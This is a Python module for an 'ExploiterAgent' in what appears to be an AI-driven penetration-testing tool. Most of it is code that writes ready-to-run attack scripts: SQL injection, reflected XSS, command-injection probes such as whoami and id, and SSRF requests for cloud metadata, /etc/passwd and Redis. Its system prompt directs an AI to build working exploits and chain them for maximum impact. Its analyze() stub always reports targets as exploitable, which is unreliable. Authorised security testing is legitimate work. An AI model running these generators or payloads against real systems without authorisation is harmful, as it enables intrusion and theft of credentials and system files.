"""
Exploiter Agent - Generates and executes exploits
"""

import asyncio
import logging
from typing import Dict, Any, List, Optional
import base64
import json

from .base import BaseAgent
from ..utils.logger import setup_logger

logger = setup_logger(__name__)

class ExploiterAgent(BaseAgent):
    """Agent responsible for exploit generation and execution"""
    
    def _get_system_prompt(self) -> str:
        return """You are an exploitation specialist AI. Your role is to:
        1. Generate working exploits for confirmed vulnerabilities
        2. Create proof-of-concept code
        3. Chain vulnerabilities for maximum impact
        4. Ensure safe exploitation without damage
        5. Document exploitation steps clearly"""
    
    async def generate_poc(self, vulnerability: Dict) -> Dict:
        """Generate proof of concept for vulnerability"""
        vuln_type = vulnerability.get('type')
        target = vulnerability.get('target')
        
        poc = {
            'vulnerability': vulnerability,
            'exploit_code': '',
            'steps': [],
            'prerequisites': [],
            'impact': '',
            'remediation': ''
        }
        
        # Generate exploit based on vulnerability type
        if vuln_type == 'sqli':
            poc['exploit_code'] = self._generate_sqli_poc(vulnerability)
        elif vuln_type == 'xss':
            poc['exploit_code'] = self._generate_xss_poc(vulnerability)
        elif vuln_type == 'rce':
            poc['exploit_code'] = self._generate_rce_poc(vulnerability)
        elif vuln_type == 'ssrf':
            poc['exploit_code'] = self._generate_ssrf_poc(vulnerability)
        else:
            # Use AI for other types
            prompt = f"""Generate a proof of concept exploit for:
            Type: {vuln_type}
            Target: {target}
            Details: {json.dumps(vulnerability, indent=2)}
            
            Provide safe, non-destructive exploit code."""
            
            response = await self.think(prompt, vulnerability)
            poc['exploit_code'] = response
        
        # Add exploitation steps
        poc['steps'] = [
            f"1. Target the vulnerable parameter at {target}",
            f"2. Insert the exploit payload",
            f"3. Observe the response for confirmation",
            f"4. Document the impact"
        ]
        
        poc['impact'] = self._assess_impact(vuln_type)
        poc['remediation'] = self._suggest_remediation(vuln_type)
        
        return poc
    
    def _generate_sqli_poc(self, vuln: Dict) -> str:
        """Generate SQL injection PoC"""
        target = vuln.get('target', 'http://example.com')
        param = vuln.get('parameter', 'id')
        
        return f"""#!/usr/bin/env python3
# SQL Injection Proof of Concept
import requests

target = "{target}"
vulnerable_param = "{param}"

# Test for SQL injection
payloads = [
    "' OR '1'='1",
    "1' UNION SELECT NULL, version()--",
    "1' AND SLEEP(5)--"
]

for payload in payloads:
    params = {{vulnerable_param: payload}}
    response = requests.get(target, params=params)
    
    print(f"Payload: {{payload}}")
    print(f"Status: {{response.status_code}}")
    print(f"Response length: {{len(response.text)}}")
    
    # Check for SQL errors
    errors = ['SQL', 'mysql', 'syntax', 'database']
    if any(err in response.text.lower() for err in errors):
        print("[!] SQL Error detected - vulnerability confirmed!")
        break
"""
    
    def _generate_xss_poc(self, vuln: Dict) -> str:
        """Generate XSS PoC"""
        target = vuln.get('target', 'http://example.com')
        param = vuln.get('parameter', 'search')
        
        return f"""#!/usr/bin/env python3
# XSS Proof of Concept
import requests
from urllib.parse import quote

target = "{target}"
vulnerable_param = "{param}"

# XSS payloads
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')"
]

for payload in payloads:
    params = {{vulnerable_param: payload}}
    response = requests.get(target, params=params)
    
    print(f"Payload: {{payload}}")
    
    # Check if payload is reflected
    if payload in response.text:
        print("[!] XSS vulnerability confirmed - payload reflected!")
        print(f"Exploit URL: {{target}}?{{vulnerable_param}}={{quote(payload)}}")
        break
"""
    
    def _generate_rce_poc(self, vuln: Dict) -> str:
        """Generate RCE PoC"""
        target = vuln.get('target', 'http://example.com')
        
        return f"""#!/usr/bin/env python3
# Remote Code Execution Proof of Concept
import requests

target = "{target}"

# RCE test payloads (safe commands)
payloads = [
    "; echo 'vulnerable' | base64",
    "| whoami",
    "${{7*7}}",
    "`id`"
]

headers = {{
    'User-Agent': 'RavenX-Security-Test'
}}

for payload in payloads:
    data = {{'input': payload}}
    response = requests.post(target, data=data, headers=headers)
    
    print(f"Payload: {{payload}}")
    print(f"Response: {{response.text[:200]}}")
    
    # Check for command execution indicators
    if 'vulnerable' in response.text or 'uid=' in response.text:
        print("[!] RCE vulnerability confirmed!")
        break
"""
    
    def _generate_ssrf_poc(self, vuln: Dict) -> str:
        """Generate SSRF PoC"""
        target = vuln.get('target', 'http://example.com')
        
        return f"""#!/usr/bin/env python3
# SSRF Proof of Concept
import requests

target = "{target}"

# SSRF test endpoints
ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://localhost:8080/admin",
    "file:///etc/passwd",
    "gopher://localhost:6379/_INFO"  # Redis
]

for ssrf_url in ssrf_targets:
    params = {{'url': ssrf_url}}
    response = requests.get(target, params=params)
    
    print(f"SSRF Target: {{ssrf_url}}")
    print(f"Status: {{response.status_code}}")
    
    # Check for successful SSRF
    if response.status_code == 200:
        print(f"Response: {{response.text[:200]}}")
        if 'root:' in response.text or 'ami-id' in response.text:
            print("[!] SSRF vulnerability confirmed!")
            break
"""
    
    def _assess_impact(self, vuln_type: str) -> str:
        """Assess impact of vulnerability"""
        impacts = {
            'sqli': 'Database compromise, data theft, authentication bypass',
            'xss': 'Session hijacking, phishing, client-side attacks',
            'rce': 'Complete system compromise, data breach, service disruption',
            'ssrf': 'Internal network access, cloud metadata theft, service exploitation',
            'xxe': 'File disclosure, SSRF, denial of service',
            'lfi': 'Source code disclosure, sensitive file access',
            'csrf': 'Unauthorized actions, account takeover'
        }
        return impacts.get(vuln_type, 'Security breach, data exposure')
    
    def _suggest_remediation(self, vuln_type: str) -> str:
        """Suggest remediation for vulnerability"""
        remediations = {
            'sqli': 'Use parameterized queries, input validation, least privilege',
            'xss': 'Output encoding, CSP headers, input sanitization',
            'rce': 'Input validation, sandboxing, disable dangerous functions',
            'ssrf': 'Whitelist URLs, disable redirects, network segmentation',
            'xxe': 'Disable external entities, use safe parsers',
            'lfi': 'Input validation, path normalization, access controls',
            'csrf': 'CSRF tokens, SameSite cookies, verify referer'
        }
        return remediations.get(vuln_type, 'Implement security best practices')
    
    async def analyze(self, target: str) -> Dict:
        """Analyze target for exploitation"""
        return {
            'target': target,
            'exploitable': True,
            'confidence': 0.8
        }
    
    async def execute(self, task: Dict) -> Any:
        """Execute exploitation task"""
        task_type = task.get('type', 'generate_poc')
        
        if task_type == 'generate_poc':
            return await self.generate_poc(task.get('vulnerability', {}))
        elif task_type == 'chain_exploits':
            # Implement exploit chaining
            return {'status': 'not_implemented'}
        else:
            return None